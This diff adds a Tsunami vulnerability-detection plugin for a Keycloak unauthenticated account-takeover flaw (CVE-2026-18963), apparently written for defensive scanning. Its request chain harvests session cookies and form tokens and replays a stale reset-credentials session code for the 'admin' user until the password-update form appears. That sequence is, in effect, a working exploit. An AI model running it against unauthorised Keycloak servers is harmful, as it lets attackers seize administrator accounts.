@@ -1,0 +1,255 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Keycloak_CVE_2026_18963"
+  author: "dyeddala"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "TSUNAMI_COMMUNITY"
+    value: "CVE-2026-18963"
+  }
+  severity: CRITICAL
+  title: "Keycloak Unauthenticated Account Takeover via Reset-Credentials Bypass (CVE-2026-18963)"
+  description: "A flaw was found in the reset-credentials flow of the keycloak-services component in Keycloak. The issue allows an unauthenticated attacker to force the password reset process for any user without needing to click the required email verification link, resulting in full account takeover. This plugin only tests for the 'master' realm with username 'admin' in it's current state. The templated engine does not allow for testing multiple realms or users in one workflow."
+  recommendation: "Upgrade to Keycloak 26.7.2, 26.6.6, 26.4.15 or later. Temporary mitigation: disable 'Forgot Password' in all realms."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2026-18963"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_keycloak"
+  http_request: {
+    method: GET
+    uri: "/realms/{{ REALM }}/.well-known/openid-configuration"
+    client_options: {
+      disable_follow_redirects: false
+    }
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "authorization_endpoint" },
+          { body: {} contains: "/realms/{{ REALM }}" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "step_1_auth"
+  http_request: {
+    method: GET
+    uri: "/realms/{{ REALM }}/protocol/openid-connect/auth?client_id=security-admin-console&redirect_uri={{ T_NS_BASEURL }}admin/{{ REALM }}/console/&response_type=code&scope=openid&code_challenge_method=S256&code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM"
+    client_options: {
+      disable_follow_redirects: false
+    }
+    response: {
+      http_status: 200
+      extract_all: {
+        patterns: [
+          {
+            from_header: { name: "Set-Cookie" }
+            regexp: "AUTH_SESSION_ID=([^;]+)"
+            variable_name: "AUTH_SESSION_ID"
+          },
+          {
+            from_header: { name: "Set-Cookie" }
+            regexp: "KC_RESTART=([^;]+)"
+            variable_name: "KC_RESTART"
+          },
+          {
+            from_body: {}
+            regexp: "client_id=([^&\"']+)"
+            variable_name: "CLIENT_ID"
+          },
+          {
+            from_body: {}
+            regexp: "tab_id=([^&\"']+)"
+            variable_name: "TAB_ID"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "step_2_reset"
+  http_request: {
+    method: GET
+    uri: "/realms/{{ REALM }}/login-actions/reset-credentials?client_id={{ CLIENT_ID }}&tab_id={{ TAB_ID }}"
+    headers: [
+      { name: "Cookie" value: "AUTH_SESSION_ID={{ AUTH_SESSION_ID }}; KC_RESTART={{ KC_RESTART }}" }
+    ]
+    client_options: {
+      disable_follow_redirects: false
+    }
+    response: {
+      http_status: 200
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "(?s)(?:.*id=\"kc-reset-password-form\"|.*?id=\"kc-select-credential-form\")[^>]*action=\"[^\"]*session_code=([^&\"']+)"
+            variable_name: "RESET_SESSION_CODE"
+          },
+          {
+            from_body: {}
+            regexp: "(?s)(?:.*id=\"kc-reset-password-form\"|.*?id=\"kc-select-credential-form\")[^>]*action=\"[^\"]*execution=([^&\"']+)"
+            variable_name: "RESET_EXECUTION"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "step_3_try_another_way"
+  http_request: {
+    method: POST
+    uri: "/realms/{{ REALM }}/login-actions/reset-credentials?session_code={{ RESET_SESSION_CODE }}&execution={{ RESET_EXECUTION }}&client_id={{ CLIENT_ID }}&tab_id={{ TAB_ID }}"
+    headers: [
+      { name: "Content-Type" value: "application/x-www-form-urlencoded" },
+      { name: "Cookie" value: "AUTH_SESSION_ID={{ AUTH_SESSION_ID }}; KC_RESTART={{ KC_RESTART }}" }
+    ]
+    data: "tryAnotherWay=on"
+    client_options: {
+      disable_follow_redirects: false
+    }
+    response: {
+      http_status: 200
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "(?s)(?:.*id=\"kc-select-credential-form\"|.*?id=\"kc-reset-password-form\")[^>]*action=\"[^\"]*session_code=([^&\"']+)"
+            variable_name: "SELECTOR_SESSION_CODE"
+          },
+          {
+            from_body: {}
+            regexp: "(?s)(?:.*id=\"kc-select-credential-form\"|.*?id=\"kc-reset-password-form\")[^>]*action=\"[^\"]*execution=([^&\"']+)"
+            variable_name: "SELECTOR_EXECUTION"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "step_4_submit_username"
+  http_request: {
+    method: POST
+    uri: "/realms/{{ REALM }}/login-actions/reset-credentials?session_code={{ SELECTOR_SESSION_CODE }}&execution={{ SELECTOR_EXECUTION }}&client_id={{ CLIENT_ID }}&tab_id={{ TAB_ID }}"
+    headers: [
+      { name: "Content-Type" value: "application/x-www-form-urlencoded" },
+      { name: "Cookie" value: "AUTH_SESSION_ID={{ AUTH_SESSION_ID }}; KC_RESTART={{ KC_RESTART }}" }
+    ]
+    data: "username={{ USERNAME }}"
+    client_options: {
+      disable_follow_redirects: false
+    }
+    response: {
+      expect_all: {
+        conditions: [
+          { body: {} contains: "/login-actions/restart" },
+          { body: {} contains: "skip_logout=true" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "step_6_get_stale"
+  http_request: {
+    method: GET
+    uri: "/realms/{{ REALM }}/login-actions/reset-credentials?client_id={{ CLIENT_ID }}&tab_id={{ TAB_ID }}"
+    headers: [
+      { name: "Cookie" value: "AUTH_SESSION_ID={{ AUTH_SESSION_ID }}; KC_RESTART={{ KC_RESTART }}" }
+    ]
+    client_options: {
+      disable_follow_redirects: false
+    }
+    response: {
+      http_status: 200
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "(?s)(?:.*id=\"kc-select-credential-form\"|.*?id=\"kc-reset-password-form\")[^>]*action=\"[^\"]*session_code=([^&\"']+)"
+            variable_name: "STALE_SESSION_CODE"
+          },
+          {
+            from_body: {}
+            regexp: "(?s)(?:.*id=\"kc-select-credential-form\"|.*?id=\"kc-reset-password-form\")[^>]*action=\"[^\"]*execution=([^&\"']+)"
+            variable_name: "STALE_EXECUTION"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "step_7_bypass"
+  http_request: {
+    method: POST
+    uri: "/realms/{{ REALM }}/login-actions/reset-credentials?session_code={{ STALE_SESSION_CODE }}&execution={{ STALE_EXECUTION }}&client_id={{ CLIENT_ID }}&tab_id={{ TAB_ID }}"
+    headers: [
+      { name: "Content-Type" value: "application/x-www-form-urlencoded" },
+      { name: "Cookie" value: "AUTH_SESSION_ID={{ AUTH_SESSION_ID }}; KC_RESTART={{ KC_RESTART }}" }
+    ]
+    data: "username={{ USERNAME }}"
+    client_options: {
+      disable_follow_redirects: false
+    }
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "kc-passwd-update-form" }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  variables: [
+    { name: "REALM" value: "master" },
+    { name: "USERNAME" value: "admin" }
+  ]
+  actions: [
+    "fingerprint_keycloak",
+    "step_1_auth",
+    "step_2_reset",
+    "step_3_try_another_way",
+    "step_4_submit_username",
+    "step_6_get_stale",
+    "step_7_bypass"
+  ]
+}
